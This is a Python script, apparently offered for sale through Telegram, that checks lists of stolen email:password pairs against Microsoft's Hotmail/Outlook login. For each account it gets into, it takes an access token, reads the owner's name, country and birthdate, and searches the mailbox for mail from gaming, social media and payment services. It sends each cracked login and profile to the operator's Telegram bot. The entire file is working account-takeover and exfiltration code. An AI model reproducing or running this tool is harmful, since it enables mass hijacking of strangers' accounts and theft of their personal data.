import requests,json,random,threading,time,os,sys,re,urllib.parse,telebot
from concurrent.futures import ThreadPoolExecutor,as_completed
from datetime import datetime
from colorama import init,Fore,Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

Z='\033[1;91m'
X='\033[1;93m'
Z1='\033[1;31m'
F='\033[1;92m'
A='\033[1;94m'
C='\033[1;95m'
S='\033[1;96m'
G='\033[1;34m'
HH='\033[1;34m'
M='\033[1;97m'
W1='\033[1;97m'
P='\033[1;95m'
B='\033[1;96m'

SERVICE_COUNTERS = {
    "Roblox": 0,
    "Minecraft": 0,
    "Fortnite": 0,
    "PUBG": 0,
    "Free Fire": 0,
    "Call of Duty": 0,
    "EA Sports FC": 0,
    "Valorant": 0,
    "League of Legends": 0,
    "Apex Legends": 0,
    "Steam": 0,
    "Epic Games": 0,
    "Xbox": 0,
    "PlayStation": 0,
    "Discord": 0,
    "Twitch": 0,
    "Facebook": 0,
    "Instagram": 0,
    "TikTok": 0,
    "Snapchat": 0,
    "X (Twitter)": 0,
    "Reddit": 0,
    "Telegram": 0,
    "YouTube": 0,
    "WhatsApp": 0,
    "LinkedIn": 0,
    "Spotify": 0,
    "Netflix": 0,
    "YouTube Music": 0,
    "Prime Video": 0,
    "Disney+": 0,
    "Crunchyroll": 0,
    "Microsoft": 0,
    "Outlook": 0,
    "OneDrive": 0,
    "Microsoft 365": 0,
    "PayPal": 0,
    "Amazon": 0,
    "Google": 0,
    "Apple": 0,
}

SV={
    "noreply@id.supercell.com":"Supercell",
    "security@mail.instagram.com":"Instagram",
    "security@facebookmail.com":"Facebook",
    "register@account.tiktok.com":"TikTok",
    "info@x.com":"X (Twitter)",
    "info@account.netflix.com":"Netflix",
    "noreply@crunchyroll.com":"Crunchyroll",
    "noreply@steampowered.com":"Steam",
    "xboxreps@engage.xbox.com":"Xbox",
    "help@acct.epicgames.com":"Epic Games",
    "noreply@pubgmobile.com":"PUBG Mobil",
    "noreply@roblox.com":"Roblox",
    "noreply@minecraft.net":"Minecraft",
    "noreply@fortnite.com":"Fortnite",
    "noreply@freefire.com":"Free Fire",
    "noreply@callofduty.com":"Call of Duty",
    "noreply@ea.com":"EA Sports FC",
    "noreply@valorant.com":"Valorant",
    "noreply@leagueoflegends.com":"League of Legends",
    "noreply@apexlegends.com":"Apex Legends",
    "noreply@playstation.com":"PlayStation",
    "noreply@discord.com":"Discord",
    "noreply@twitch.tv":"Twitch",
    "noreply@snapchat.com":"Snapchat",
    "noreply@reddit.com":"Reddit",
    "noreply@telegram.org":"Telegram",
    "noreply@youtube.com":"YouTube",
    "noreply@whatsapp.com":"WhatsApp",
    "noreply@linkedin.com":"LinkedIn",
    "noreply@spotify.com":"Spotify",
    "noreply@youtubemusic.com":"YouTube Music",
    "noreply@primevideo.com":"Prime Video",
    "noreply@disneyplus.com":"Disney+",
    "noreply@microsoft.com":"Microsoft",
    "noreply@outlook.com":"Outlook",
    "noreply@onedrive.com":"OneDrive",
    "noreply@microsoft365.com":"Microsoft 365",
    "noreply@paypal.com":"PayPal",
    "noreply@amazon.com":"Amazon",
    "noreply@google.com":"Google",
    "noreply@apple.com":"Apple",
}

game_choices = [
    "Clash of Clans",
    "Clash Royale",
    "Brawl Stars",
    "Hay Day",
    "Squad Busters",
    "Boom Beach",
    "Clash Quest",
    "Clash Mini",
    "Rush Wars",
    "Everdale",
    "Smash Land",
    "Spooky Pop",
    "Pets vs Orcs",
    "Battle Buddies",
    "Gunshine",
    "Radiant"
]

stats = {
    "hits": 0,
    "twofactor": 0,
    "custom": 0,
    "bad": 0,
    "retries": 0
}

def display_counters():
    os.system('clear')
    
    print(f"""{G}
╱╱╭━━━╮╱╭━━━╮
╱╱┃╭━╮┃╱┃╭━╮┃
╭━┻┫╭╯┣━┻┫╭╯┣━━╮
┃╭╮┃┃╭┫━━┫┃╭┫━━┫
┃╰╯┃┃┃┣━━┃┃┃┣━━┃
┃╭━╯╰╯╰━━╯╰╯╰━━╯
┃┃
╰╯
PY: @p7s7s ~ t.me/ali313eme
{M}""")
    
    print(f"{Z}━━━━━━━━━━━ [ 𝑷𝑺_ 𝑷𝒂𝒊𝒅 ] ━━━━━━━━━━━{M}\n")
    
    for service, count in SERVICE_COUNTERS.items():
        print(f"{C}[{M} {A}●{M} {C}]{M} {W1}{service}{M} {P}>>>{M} {Z}{{{M} {F}{count}{M} {Z}}}{M}")
    
    print(f"\n{Z}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{M}\n")
    
    print(f"{A}Hits{Z}:{M} {F}{stats['hits']}{M}")
    print(f"{A}2FA{Z}:{M} {F}{stats['twofactor']}{M}")
    print(f"{A}Custom{Z}:{M} {F}{stats['custom']}{M}")
    print(f"{A}Bad{Z}:{M} {F}{stats['bad']}{M}")
    print(f"{A}Retries{Z}:{M} {F}{stats['retries']}{M}")
    print(f"{Z}━━━━━━━━━━━━━━━━━━{M}")
    print(f"{HH}PY: @p7s7s / @ali313eme{M}")

class HotmailSupercellChecker:
    def __init__(self):
        self.lock=threading.Lock()
        self.session=requests.Session()
        self.session.verify=False
        self.last_display_time = time.time()

    def get_flag(self, country_name):
        import pycountry
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except LookupError:
            return '🏳'

    def load_combo(self,combo_file):
        if not os.path.exists(combo_file):
            print(f"{Z}[Combo file not found]{M}")
            return[]
        combos=[]
        with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
            for line in f:
                line=line.strip()
                if':'in line:
                    combos.append(line)
        return combos

    def send_telegram(self,username,password,links,games_info,name,flag,country,birthdate):
        try:
            lk=""
            for sv in links:
                lk+=f"• {sv}\n"

            ms = (
                f"<b>━━━━━━━ HIT ━━━━━━━</b>\n"
                f"<code>{username}:{password}</code>\n"
                f"<b>━━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Name     :</b> {name}\n"
                f"<b>Country  :</b> {flag} {country}\n"
                f"<b>Birth    :</b> {birthdate}\n"
                f"<b>━━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Services</b>\n"
                f"{lk}"
                f"<b>━━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Games</b>\n"
                f"{games_info}\n"
                f"<b>━━━━━━━━━━━━━━━━━━</b>\n"
                f"<i>لشراء الاداه تواصل مع المطور \n@p7s7s ~ @ali313eme</i>"
            )
            TB.send_message(CHAT_ID, ms, parse_mode='HTML')
        except Exception as e:
            print(f"{Z}Error sending Telegram message: {e}{M}")

    def update_display_if_needed(self):
        current_time = time.time()
        if current_time - self.last_display_time >= 1:
            self.last_display_time = current_time
            display_counters()

    def check_account(self,username,password):
        try:
            login_url="https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
            payload={'ps':'2','psRNGCDefaultType':'','psRNGCEntropy':'','psRNGCSLK':'','canary':'','ctx':'','hpgrequestid':'','PPFT':'-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$','PPSX':'Pa','NewUser':'1','FoundMSAs':'','fspost':'0','i21':'0','CookieDisclosure':'0','IsFidoSupported':'1','isSignupPost':'0','isRecoveryAttemptPost':'0','i13':'1','login':username,'loginfmt':username,'type':'11','LoginOptions':'1','lrt':'','lrtPartition':'','hisRegion':'','hisScaleUnit':'','passwd':password}
            headers={'Origin':'https://login.live.com','Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Sec-Fetch-Dest':'document','Referer':'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={username}','Accept-Language':'en-US,en;q=0.9','Cookie':'MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1; OParams=11O.Dor!ityyROuDARitpqlq4!6jDuS3TVfYeLnCZLW20ulsO01Qdr0qXZuVyFO!VZa*Ode4!5h*e1lPmdhKFK*6ILTEw4ijD1A8v7hGiQ8bGpPjhK3yWl0EV*mAvY4JhtfpSjuRnVhijB9BBans*iz34S6vrrGPp33lLT587mBFUxPivMbVSru!YTfb0UOm1orslTW9OU0Swk!a!SLJBnMnMD*fzrT*NgzjbkQkWYIBGvKY5*IM5n8iVuQAaElo9KJHfzxnnEdy4RBOhlUdJTexq3ggPsaje8GeZfSN0C78uHTH4J8zXgXFtGqjM5lu!mjcBIF0Y5HqLO4okxAlSs3c0BoY7OOGYeYRpnqhZvgRgmdHSgcH8sLtn1ln2Hr8iGoiAQ$$; MicrosoftApplicationsTelemetryDeviceId=60aecd7a-f1a5-4753-b014-1f35eaee233c; ai_session=MJm/eRczdMHWqhQym5bUBG|1716447265233|1716447265233; MSFPC=GUID=8edf406d4669417a93d813d0d4a37bc1&HASH=8edf&LV=202405&V=4&LU=1716447268126','Accept-Encoding':'gzip, deflate','Content-Length':'566'}
            
            try:
                response=requests.post(login_url,data=payload,headers=headers,timeout=30,verify=False,allow_redirects=False)
            except:
                with self.lock:
                    stats['retries'] += 1
                self.update_display_if_needed()
                return"RETRY"
            
            response_text=response.text
            if"Your account or password is incorrect."in response_text or"That Microsoft account doesn't exist."in response_text or"Sign in to your Microsoft account"in response_text:
                with self.lock:
                    stats['bad'] += 1
                self.update_display_if_needed()
                return"BAD"
            if",AC:null,urlFedConvertRename"in response_text:
                with self.lock:
                    stats['bad'] += 1
                self.update_display_if_needed()
                return"BAN"
            if"account.live.com/recover?mkt"in response_text or"recover?mkt"in response_text or"account.live.com/identity/confirm?mkt"in response_text or"Email/Confirm?mkt"in response_text:
                with self.lock:
                    stats['twofactor'] += 1
                self.update_display_if_needed()
                self.save_result(username,password,"2FA ENABLED",None,"2FA")
                return"2FA"
            if"/cancel?mkt="in response_text or"/Abuse?mkt="in response_text:
                with self.lock:
                    stats['custom'] += 1
                self.update_display_if_needed()
                return"CUSTOM"
            
            success_cookies='ANON'in str(response.cookies)or'WLSSC'in str(response.cookies)
            success_address='https://login.live.com/oauth20_desktop.srf?'in response.headers.get('Location','')
            
            if success_cookies or success_address:
                cookies=response.cookies
                location=response.headers.get('Location','')
                refresh_token=None
                if'refresh_token='in location:
                    start=location.find('refresh_token=')+len('refresh_token=')
                    end=location.find('&',start)
                    if end==-1:
                        end=len(location)
                    refresh_token=location[start:end]
                if not refresh_token:
                    try:
                        if'#'in location:
                            fragment=location.split('#')[1]
                            params=dict(x.split('=')for x in fragment.split('&')if'='in x)
                            refresh_token=params.get('refresh_token')
                    except:
                        pass
                if not refresh_token:
                    with self.lock:
                        stats['bad'] += 1
                    self.update_display_if_needed()
                    return"BAD"
                
                token_url="https://login.live.com/oauth20_token.srf"
                token_payload={'grant_type':'refresh_token','client_id':'0000000048170EF2','scope':'https://substrate.office.com/User-Internal.ReadWrite','redirect_uri':'https://login.live.com/oauth20_desktop.srf','refresh_token':refresh_token,'uaid':'db28da170f2a4b85a26388d0a6cdbb6e'}
                token_headers={'x-ms-sso-Ignore-SSO':'1','User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Content-Length':'547','Host':'login.live.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
                
                try:
                    token_response=requests.post(token_url,data=token_payload,headers=token_headers,timeout=30,verify=False)
                except:
                    with self.lock:
                        stats['retries'] += 1
                    self.update_display_if_needed()
                    return"RETRY"
                
                if token_response.status_code!=200:
                    with self.lock:
                        stats['bad'] += 1
                    self.update_display_if_needed()
                    return"BAD"
                
                try:
                    token_data=token_response.json()
                    access_token=token_data.get('access_token')
                    if not access_token:
                        with self.lock:
                            stats['bad'] += 1
                        self.update_display_if_needed()
                        return"BAD"
                    
                    outlook_headers={'User-Agent':'Outlook-Android/2.0','Pragma':'no-cache','Accept':'application/json','ForceSync':'false','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Host':'substrate.office.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
                    
                    name = "Unknown"
                    country = "Unknown"
                    flag = "🏳"
                    birthdate = "Unknown"
                    
                    try:
                        profile_res = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=outlook_headers, timeout=15, verify=False).json()
                        name = profile_res.get('names', [{}])[0].get('displayName', 'Unknown')
                        country = profile_res.get('accounts', [{}])[0].get('location', 'Unknown')
                        flag = self.get_flag(country)
                        try:
                            birthdate = "{:04d}-{:02d}-{:02d}".format(
                                profile_res["accounts"][0]["birthYear"],
                                profile_res["accounts"][0]["birthMonth"],
                                profile_res["accounts"][0]["birthDay"]
                            )
                        except:
                            pass
                    except:
                        pass
                    
                    found_links=[]
                    found_games=[]
                    
                    for email,service in SV.items():
                        search_url="https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                        search_payload={"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"Egypt Standard Time","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Query":{"QueryString":email},"RefiningQueries":None,"Size":25,"Sort":[{"Field":"Score","SortDirection":"Desc","Count":3},{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":True,"TopResultsCount":3}],"AnswerEntityRequests":[{"Query":{"QueryString":email},"EntityTypes":["Event","File"],"From":0,"Size":10,"EnableAsyncResolution":True}],"QueryAlterationOptions":{"EnableSuggestion":True,"EnableAlteration":True,"SupportedRecourseDisplayTypes":["Suggestion","NoResultModification","NoResultFolderRefinerModification","NoRequeryModification","Modification"]},"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}
                        
                        try:
                            search_response=requests.post(search_url,json=search_payload,headers=outlook_headers,timeout=30,verify=False)
                            if search_response.status_code==200:
                                search_data=search_response.json()
                                total_msgs=0
                                search_text=json.dumps(search_data)
                                if '"Total":' in search_text:
                                    try:
                                        start=search_text.find('"Total":')+len('"Total":')
                                        end=search_text.find(',',start)
                                        total_str=search_text[start:end].strip()
                                        total_msgs=int(total_str)
                                    except:
                                        pass
                                
                                if total_msgs>0:
                                    found_links.append(service)
                                    if service in SERVICE_COUNTERS:
                                        SERVICE_COUNTERS[service] += 1
                                    for game in game_choices:
                                        if game.lower() in search_text.lower():
                                            if game not in found_games:
                                                found_games.append(game)
                        except:
                            continue
                    
                    if found_links:
                        with self.lock:
                            stats['hits'] += 1
                        
                        if found_games:
                            games_str = " + ".join(found_games)
                        else:
                            games_str = "No Games Found ❌"
                        
                        info_str = f"Name: {name} | Country: {flag} {country} | Birthdate: {birthdate} | Games: {games_str}"
                        self.save_result(username,password,info_str,None,"HIT")
                        self.send_telegram(username,password,found_links,games_str,name,flag,country,birthdate)
                        self.update_display_if_needed()
                        return"HIT"
                    else:
                        with self.lock:
                            stats['custom'] += 1
                        self.update_display_if_needed()
                        self.save_result(username,password,"NOT LINKED",None,"FREE")
                        return"CUSTOM"
                except:
                    with self.lock:
                        stats['bad'] += 1
                    self.update_display_if_needed()
                    return"BAD"
            else:
                with self.lock:
                    stats['bad'] += 1
                self.update_display_if_needed()
                return"BAD"
        except:
            with self.lock:
                stats['retries'] += 1
            self.update_display_if_needed()
            return"RETRY"

    def save_result(self,username,password,info,proxy=None,hit_type="FREE"):
        if hit_type=="HIT":
            with open("hits.txt","a",encoding="utf-8")as f:
                f.write(f"{username}:{password} - {info}\n")
        elif hit_type=="2FA":
            with open("2fa.txt","a",encoding="utf-8")as f:
                f.write(f"{username}:{password} - {info}\n")

    def run_checker(self,combo_file):
        combos=self.load_combo(combo_file)
        if not combos:
            print(f"{Z}No combos{M}")
            return
        
        display_counters()
        
        batch_size=500
        for i in range(0,len(combos),batch_size):
            batch=combos[i:i+batch_size]
            with ThreadPoolExecutor(max_workers=min(50,len(batch)))as executor:
                futures=[]
                for combo in batch:
                    try:
                        username,password=combo.split(':',1)
                        futures.append(executor.submit(self.check_account,username.strip(),password.strip()))
                    except:
                        continue
                for future in as_completed(futures):
                    result=future.result()
        
        display_counters()

def main():
    checker=HotmailSupercellChecker()
    try:
        checker.run_checker(file_path)
    except KeyboardInterrupt:
        print(f"\n{Z}Checker stopped by user{M}")
        display_counters()
    except Exception as e:
        print(f"{Z}Error: {e}{M}")

TOKEN = input(f'{G}Enter Bot Token : {M}')
CHAT_ID = input(f'{G}Enter Chat ID : {M}')
TB = telebot.TeleBot(TOKEN)

file_path = input(f'{X}Enter combo file: {M}').strip()

if __name__=="__main__":
    main()